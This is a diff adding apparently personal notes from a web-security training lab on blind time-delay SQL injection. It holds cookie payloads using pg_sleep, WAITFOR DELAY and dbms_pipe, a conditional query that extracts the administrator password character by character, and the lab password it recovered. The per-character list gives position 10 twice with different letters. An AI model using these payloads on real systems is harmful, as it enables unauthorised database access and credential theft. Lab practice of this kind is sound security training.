@@ -1,0 +1,52 @@
+Lab: Blind SQL injection with time delays and information retrieval
+
+1.) Try different unconditional delay payloads to confirm vulnerability and discover database Used
+
+
+Oracle payload: NO SUCCESS
+Cookie: TrackingId=gqxGeE4W4frNCHhy' || (dbms_pipe.receive_message(('a'),10))--;
+
+Microsoft SQL payload: NO SUCCESS
+Cookie: TrackingId=gqxGeE4W4frNCHhy' + (WAITFOR DELAY '0:0:10')--;
+
+postgreSQL Payload: SUCCESS
+Cookie: TrackingId=gqxGeE4W4frNCHhy' || (SELECT pg_sleep(10))--;
+
+
+2.) Webapp uses postgreSQL, add conditional statement to glean information with conditional delay
+
+Constructing payload:
+Cookie: TrackingId=gqxGeE4W4frNCHhy' || (SELECT CASE WHEN (1=1) THEN pg_sleep(30) ELSE NULL END from users where username='administrator' and SUBSTRING(password, 1, 1) = 'a')--;
+
+`from users where...` is the query for the information that I actually want. If this portion of the sql evaluates to true, then the first query is run, causing a conditional delay.
+
+3.) Send payload to intruder with clusterbomb attack and see which payload response times matched the sleep time
+
+4.) My internet was being stressed too heavily by intruder, so I had to reduce concurrent requests to 1, and change sleep(5). Before this change, I was getting drastically different response times, even when a delay was not triggered - it made it impossible to figure the password
+
+
+
+Password:
+f584iir99hxtrf3gco37
+
+10: t
+13: r
+4: 4
+1: f
+20: 7
+6: i
+5: i
+9: 9
+8: 9
+12: t
+3: 8
+14: f
+7: r
+10: h
+2: 5
+15: 3
+17: c
+16: g
+19: 3
+11: x
+18: o
